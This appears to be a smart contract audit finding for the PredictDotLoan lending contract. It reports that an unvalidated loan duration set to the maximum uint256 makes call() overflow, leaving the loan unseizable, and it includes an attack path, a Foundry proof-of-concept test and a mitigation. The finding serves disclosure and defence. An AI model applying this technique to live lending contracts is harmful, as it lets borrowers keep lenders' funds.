# Malicious borrower can create an unseizable loan due to lack of validation on the Proposal's duration

### Summary

The contract does not enforce any checks on the` Proposal.duration` parameter, allowing a malicious borrower to set a value so high that it will be impossible to seize the loan, leading to a complete loss of funds for the lender.

### Root Cause

The `Proposal.duration` parameter's complete lack of validation can allow a malicious borrower to forge a Proposal with an infinite duration, `type(uint256.max)`, making `call()` always revert from overflow.

As we can see below, this parameter, will be saved as the loan `minimumDuration`:
```solidity
function _createLoan(.., Proposal calldata proposal, ...) private {
    // snip
   loans[id].minimumDuration = proposal.duration;
   // snip
}
```

[`PredictDotLoan:call()`](https://github.com/sherlock-audit/2024-09-predict-fun/blob/41e70f9eed3f00dd29aba4038544150f5b35dccb/predict-dot-loan/contracts/PredictDotLoan.sol#L540) disallow from calling the loan until his duration has passed, that will panic overflow if `loan.minimumDuration == type(uint256).max`:

```solidity
if (loan.startTime + loan.minimumDuration > block.timestamp) {
    revert LoanNotMatured();
}
```

Additionally, the lender cannot auction the loan to someone else because only `Called` loans can be auctioned, as seen below:

```solidity
function auction(uint256 loanId) external nonReentrant whenNotPaused {
    Loan storage loan = loans[loanId];

    _assertLoanStatus(loan.status, LoanStatus.Called);

    // snip
}
```

Only the borrower can close the loan via [`repay()`](https://github.com/sherlock-audit/2024-09-predict-fun/blob/41e70f9eed3f00dd29aba4038544150f5b35dccb/predict-dot-loan/contracts/PredictDotLoan.sol#L454), since no `minumumDuration` is enforced in such function, but he's not incentivized at all since he will accrue infinite debt.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Malicious borrower forges a Proposal such that `duration == type(uint256.max)`
2. A lender accepts the Proposal
3. Now, the borrower, effectively has free money

### Impact

If a malicious borrower manages to get such `Proposal ` approved, he will have free money for eternity, since the lender cannot call or auction the loan.

### PoC

Add the following test to `PredictDotLoan.acceptBorrowRequest.t.sol`:

```solidity
function test_infitite_duration_seize_impossible() public {
    IPredictDotLoan.Proposal memory proposal = _generateBorrowRequest(IPredictDotLoan.QuestionType.Binary);
    proposal.from = borrower;
    proposal.duration = type(uint256).max;
    proposal.signature = _signProposal(proposal, borrowerPrivateKey);

    mockERC20.mint(lender, proposal.loanAmount);
    _mintCTF(borrower);

    vm.prank(lender);
    mockERC20.approve(address(predictDotLoan), proposal.loanAmount);

    vm.prank(borrower);
    mockCTF.setApprovalForAll(address(predictDotLoan), true);

    vm.startPrank(lender);
    predictDotLoan.acceptBorrowRequest(proposal, proposal.loanAmount);

    vm.warp(block.timestamp + 100 days);
    
    vm.expectRevert(); // 0x11 Panic Overflow
    predictDotLoan.call(1);
}
```

### Mitigation

Enforce a reasonable loan duration period in the loan acceptance logic.
